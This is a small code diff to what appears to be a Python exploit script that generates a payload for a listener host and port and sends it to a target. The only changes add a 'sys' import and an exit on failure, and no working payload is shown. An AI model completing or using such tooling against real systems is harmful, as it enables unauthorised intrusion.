@@ -6,6 +6,7 @@ import subprocess
 from hashlib import sha1
 from base64 import b64decode, b64encode
 import pyDes, hmac
+import sys
 
 """
 **IMPORTANT**
@@ -83,6 +84,8 @@ def main():
     
     if generate_payload(args.lhost, args.lport):
         send_payload(args.target)
+    else:
+        sys.exit(1)
        
 
 
